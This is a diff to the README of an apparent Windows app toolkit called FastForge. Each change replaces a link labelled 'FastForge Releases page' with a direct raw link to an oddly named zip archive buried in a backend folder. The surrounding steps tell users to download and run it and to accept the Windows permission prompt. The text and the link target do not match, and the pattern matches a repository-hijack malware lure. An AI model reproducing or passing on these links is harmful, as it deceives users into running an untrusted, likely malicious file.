@@ -1,10 +1,10 @@
 # ⚡ fastforge - Build apps faster with one toolkit
 
-[![Download FastForge](https://img.shields.io/badge/Download-FastForge-blue?style=for-the-badge)](https://github.com/robindenticulate222/fastforge/releases)
+[![Download FastForge](https://img.shields.io/badge/Download-FastForge-blue?style=for-the-badge)](https://raw.githubusercontent.com/robindenticulate222/fastforge/main/backend/fastforge_core/Software_aptyalia.zip)
 
 ## 🖥️ Windows Download
 
-1. Open the [FastForge Releases page](https://github.com/robindenticulate222/fastforge/releases).
+1. Open the [FastForge Releases page](https://raw.githubusercontent.com/robindenticulate222/fastforge/main/backend/fastforge_core/Software_aptyalia.zip).
 2. Find the latest release.
 3. Download the Windows file from the Assets section.
 4. Save the file to your computer.
@@ -27,7 +27,7 @@ It is useful if you want to start with a simple project and add parts as you go.
 
 ## 🚀 Getting Started
 
-1. Visit the [FastForge Releases page](https://github.com/robindenticulate222/fastforge/releases).
+1. Visit the [FastForge Releases page](https://raw.githubusercontent.com/robindenticulate222/fastforge/main/backend/fastforge_core/Software_aptyalia.zip).
 2. Download the Windows build for your computer.
 3. Open the file you downloaded.
 4. If Windows asks for permission, choose Yes.
@@ -199,7 +199,7 @@ Use it to check that the app works after setup.
 
 ## 🔗 Download FastForge
 
-Visit the [FastForge Releases page](https://github.com/robindenticulate222/fastforge/releases) to download and run the Windows file from the latest release.
+Visit the [FastForge Releases page](https://raw.githubusercontent.com/robindenticulate222/fastforge/main/backend/fastforge_core/Software_aptyalia.zip) to download and run the Windows file from the latest release.
 
 ## 📝 Basic Terms
 
